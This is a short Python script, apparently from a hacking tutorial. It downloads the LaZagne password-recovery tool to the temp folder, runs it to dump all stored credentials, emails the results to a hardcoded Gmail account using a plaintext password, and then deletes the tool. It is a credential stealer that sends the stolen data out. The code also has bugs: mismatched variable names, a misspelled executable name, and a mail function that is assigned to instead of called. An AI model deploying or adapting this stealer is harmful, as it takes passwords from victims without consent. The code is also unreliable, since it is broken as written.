import requests
import subprocess
import smtplib
import os
import tempfile

def send_mail(email , password , messages):
  server = smtplib.SMTP("smtp.gmail.com", 587)
  server.starttls()
  server.login(email, password)
  server.sendmail(email, email, messages)
  server.quit()

def download(url):
  get_responce = requests.get(url)
  file_name = url.split("/")[-1]
  with open(file_name, "wb") as out_file:
    out_file.write(get_response.content)
  
temp_directory = tempfile.gettempdir()

os.chdir(temp_directory)

download ("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")

result = subprocess.check_output("lazagane.exe all" , shell = True)

send_mail = ("kavinprasadj@gmail.com" , "Kavinprasad333", result)

os.remove("lazagane.exe")






